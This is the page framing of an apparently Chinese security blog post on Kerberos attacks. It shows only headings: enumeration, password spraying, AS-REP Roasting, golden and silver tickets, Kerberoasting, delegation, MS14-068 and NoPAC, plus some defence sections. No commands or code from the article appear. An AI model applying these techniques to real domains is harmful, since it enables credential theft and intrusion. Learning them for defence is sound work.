  <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Kerberos/" rel="tag">Kerberos</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0/" rel="tag">内网学习</a></li></ul> 

        
  <nav class="nav">
    <a></a>
    <a href="/2023/03/02/BloodHound/">BloodHound<i class="iconfont iconright"></i></a>
  </nav>

      </section>
      
        <section class="comments">
  
    <div class="btn" id="comments-btn">查看评论</div>
  
  
<div id="valine"></div>
<script defer src="//unpkg.com/valine/dist/Valine.min.js"></script>
<script>
  window.onload = function () {
    var loadValine = function () {
      new Valine({
        el: '#valine',
        app_id: "MolKGIamzoTNkVe0GP3Zbi0H-gzGzoHsz",
        app_key: "AFgQCxzt4SDNIbcm1yz6eUVc",
        placeholder: "你好",
        avatar: "mp",
        pageSize: "10",
        lang: "zh-CN",
      });
    }
    if ( true ) {
      $("#comments-btn").on("click", function () {
        $(this).hide();
        loadValine();
      });
    } else {
      loadValine();
    }
  };
</script>

</section>
      
    </section>
  </div>
</article></div>
      <div class="col-xl-3">
        
          
  <aside class="toc-wrap">
    <h3 class="toc-title">文章目录：</h3>
    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Kerberos%E8%AE%A4%E8%AF%81%E5%9F%BA%E7%A1%80"><span class="toc-text">Kerberos认证基础</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#kerberos%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B"><span class="toc-text">kerberos基础认证流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#kerberos%E6%94%BB%E5%87%BB%E5%88%86%E7%B1%BB"><span class="toc-text">kerberos攻击分类</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#AS%E9%98%B6%E6%AE%B5%E6%94%BB%E5%87%BB"><span class="toc-text">AS阶段攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E5%86%85%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE"><span class="toc-text">域内用户枚举</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E6%9E%9A%E4%B8%BE"><span class="toc-text">工具枚举</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90"><span class="toc-text">枚举抓包分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E5%86%85%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92"><span class="toc-text">域内密码喷洒</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E9%94%81%E5%AE%9A%E7%AD%96%E7%95%A5"><span class="toc-text">密码锁定策略</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E5%96%B7%E6%B4%92"><span class="toc-text">工具喷洒</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90"><span class="toc-text">密码喷洒数据包分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AS-REP-Roasting"><span class="toc-text">AS_REP Roasting</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="toc-text">攻击原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E8%BF%87%E7%A8%8B"><span class="toc-text">攻击过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96hash"><span class="toc-text">获取hash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A0%B4%E8%A7%A3hash"><span class="toc-text">破解hash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AS-REP-Roasting%E9%98%B2%E5%BE%A1"><span class="toc-text">AS_REP Roasting防御</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-text">黄金票据</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E6%8F%90"><span class="toc-text">前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9C%80%E6%B1%82"><span class="toc-text">需求</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8Impacket%E6%94%BB%E5%87%BB"><span class="toc-text">利用Impacket攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8mimikatz%E6%94%BB%E5%87%BB"><span class="toc-text">利用mimikatz攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8CS%E6%94%BB%E5%87%BB"><span class="toc-text">利用CS攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#TGS%E9%98%B6%E6%AE%B5%E6%94%BB%E5%87%BB"><span class="toc-text">TGS阶段攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#kerberosasting%E6%94%BB%E5%87%BB"><span class="toc-text">kerberosasting攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-2"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4"><span class="toc-text">攻击步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kerberoasting%E9%98%B2%E5%BE%A1"><span class="toc-text">Kerberoasting防御</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="toc-text">白银票据</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-3"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9C%80%E6%B1%82-1"><span class="toc-text">需求</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8impacket%E6%94%BB%E5%87%BB"><span class="toc-text">利用impacket攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8mimikatz%E6%94%BB%E5%87%BB-1"><span class="toc-text">利用mimikatz攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8CS%E6%94%BB%E5%87%BB-1"><span class="toc-text">利用CS攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-1"><span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB"><span class="toc-text">委派攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89"><span class="toc-text">定义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E7%B1%BB"><span class="toc-text">分类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E8%83%BD%E5%A4%9F%E5%9F%9F%E5%A7%94%E6%B4%BE%E8%B4%A6%E6%88%B7"><span class="toc-text">查询能够域委派账户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB%E6%93%8D%E4%BD%9C"><span class="toc-text">委派攻击操作</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PAC%E6%94%BB%E5%87%BB"><span class="toc-text">PAC攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#MS14-068"><span class="toc-text">MS14-068</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-4"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0"><span class="toc-text">复现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NoPAC"><span class="toc-text">NoPAC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-5"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-text">利用思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C"><span class="toc-text">操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7"><span class="toc-text">工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MAQ%E4%B8%BA0%E7%9A%84%E6%94%BB%E5%87%BB"><span class="toc-text">MAQ为0的攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-text">漏洞修复</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%95%B4%E4%BD%93%E6%80%BB%E7%BB%93"><span class="toc-text">整体总结</span></a></li></ol>
  </aside>

        
      </div>
    </div>
  </div>
</main>
  

<footer class="footer">
  <div class="footer-social"><a 
        href="https://github.com/lcharmy "
        target="_blank"
        class="footer-social-item"
        onMouseOver="this.style.color= '#9f7be1'" 
        onMouseOut="this.style.color='#33333D'">
          <i class="iconfont  icongithub-fill "></i>
      </a><a 
        href="mailto:lcharmy@163.com "
        target="_blank"
        class="footer-social-item"
        onMouseOver="this.style.color=#FF3B00" 
        onMouseOut="this.style.color='#33333D'">
          <i class="iconfont  iconmail"></i>
      </a></div>
  
    <div class="footer-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
  
</footer>
  
      <div class="fab fab-plus">
    <i class="iconfont iconplus"></i>
  </div>
  
  
  
  <div class="fab fab-up">
    <i class="iconfont iconcaret-up"></i>
  </div>
  
  
  
    
<script src="/js/color-mode.js"></script>

  
  
    <div class="search">
  <div class="search-container">
    <div class="search-close">
      <i class="iconfont iconbaseline-close-px"></i>
    </div>
    <div class="search-input-wrapper">
      <i class="search-input-icon iconfont iconsearch"></i>
      <input class="search-input" type="search" id="search-input" placeholder="Search..." autofocus autocomplete="off"
        autocorrect="off" autocapitalize="off">
    </div>
    <div class="search-output" id="search-output"></div>
  </div>
</div>
  
</body>

<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>





  
<script src="https://cdn.bootcdn.net/ajax/libs/jquery.lazyload/1.9.1/jquery.lazyload.min.js"></script>




  
<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js"></script>








<script src="/js/utils.js"></script>
<script src="/js/script.js"></script>







  <script>
    (function () {
      var bp = document.createElement('script');
      var curProtocol = window.location.protocol.split(':')[0];
      if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
      } else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
      }
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(bp, s);
    })();
  </script>













</html>